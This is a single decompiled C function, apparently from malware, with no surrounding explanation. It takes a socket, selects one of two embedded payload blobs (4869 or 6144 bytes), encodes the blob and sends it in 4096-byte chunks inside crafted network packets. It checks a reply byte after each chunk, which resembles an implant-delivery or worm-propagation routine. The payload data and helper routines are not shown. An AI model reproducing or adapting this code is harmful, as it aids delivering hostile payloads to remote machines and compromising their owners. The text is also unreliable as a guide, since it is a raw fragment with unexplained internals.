int __cdecl sub_406F50(SOCKET s, int a2, int a3)
{
  const void *v3; // esi
  unsigned int v4; // ebx
  void *v5; // ebp
  char *v6; // eax
  const void *v7; // esi
  int v8; // ebx
  signed int v9; // ebp
  int v10; // esi
  bool v11; // cc
  int v12; // ebx
  _DWORD v14[3]; // [esp+10h] [ebp-20E4h] BYREF
  int v15; // [esp+1Ch] [ebp-20D8h]
  HGLOBAL hMem; // [esp+20h] [ebp-20D4h]
  int i; // [esp+24h] [ebp-20D0h]
  int v18; // [esp+28h] [ebp-20CCh]
  char buf[4293]; // [esp+2Ch] [ebp-20C8h] BYREF
  __int16 v20; // [esp+10F1h] [ebp-1003h]
  char v21; // [esp+10F3h] [ebp-1001h]
  char v22[4093]; // [esp+10F4h] [ebp-1000h] BYREF
  __int16 v23; // [esp+20F1h] [ebp-3h]
  char v24; // [esp+20F3h] [ebp-1h]

  memset(buf, 0, sizeof(buf));
  v20 = 0;
  v21 = 0;
  memset(v22, 0, sizeof(v22));
  v23 = 0;
  v24 = 0;
  memset(v14, 0, sizeof(v14));
  if ( a2 )
  {
    v3 = *(const void **)&FileName[260];
    v4 = 4869;
    v5 = &unk_506000;
  }
  else
  {
    v3 = *(const void **)&FileName[264];
    v4 = 6144;
    v5 = &unk_50D800;
  }
  v6 = (char *)GlobalAlloc(0x40u, (SIZE_T)v5 + v4 + 12);
  hMem = v6;
  if ( v6 )
  {
    qmemcpy(&v6[v4], v3, (unsigned int)v5);
    if ( (int)((int)v5 + v4) % 4 )
    {
      v15 = 4 * ((int)((int)v5 + v4) / 4) + 4;
      v6 = (char *)hMem;
    }
    else
    {
      v15 = (int)v5 + v4;
    }
    if ( a2 )
    {
      v7 = &unk_42E758;
      dword_42ECE9 = (int)v5 + 3440;
      *(int *)((char *)&dword_42E750 + v4) = (int)v5;
      *(int *)((char *)&dword_42E754 + v4) = 1;
    }
    else
    {
      v7 = &unk_42FA60;
      dword_4302CE = (int)v5 + 3978;
      *(int *)((char *)&dword_42FA58 + v4) = (int)v5;
      *(int *)((char *)&dword_42FA5C + v4) = 1;
    }
    qmemcpy(v6, v7, v4);
    sub_406F00(a3, v6, v15);
    v8 = v15 / 4096;
    v9 = v15 % 4096;
    qmemcpy(buf, &unk_42E710, 0x46u);
    v10 = 0;
    v18 = 0;
    if ( v15 / 4096 > 0 )
    {
      for ( i = 0; ; v10 = i )
      {
        v14[0] = v15;
        v14[1] = 4096;
        v14[2] = v10;
        sub_406F00(a3, v14, 12);
        *(_DWORD *)&buf[70] = v14[0];
        *(_DWORD *)&buf[74] = v14[1];
        *(_DWORD *)&buf[78] = v14[2];
        qmemcpy(&buf[82], (char *)hMem + v10, 0x1000u);
        if ( send(s, buf, 4178, 0) == -1 )
          break;
        if ( recv(s, v22, 4096, 0) == -1 )
          break;
        if ( v22[34] != 82 )
          break;
        v11 = ++v18 < v8;
        i += 4096;
        if ( !v11 )
          break;
      }
    }
    if ( v9 > 0 )
    {
      *(_WORD *)&buf[2] = htons(v9 + 78);
      *(_WORD *)&buf[67] = v9 + 13;
      v12 = v8 << 12;
      *(_WORD *)&buf[39] = v9;
      *(_WORD *)&buf[59] = v9;
      v14[0] = v15;
      v14[1] = v9;
      v14[2] = v12;
      sub_406F00(a3, v14, 12);
      *(_DWORD *)&buf[78] = v14[2];
      *(_DWORD *)&buf[70] = v14[0];
      *(_DWORD *)&buf[74] = v14[1];
      qmemcpy(&buf[82], (char *)hMem + v12, v9);
      if ( send(s, buf, v9 + 82, 0) != -1 )
        recv(s, v22, 4096, 0);
    }
    GlobalFree(hMem);
  }
  return 0;
}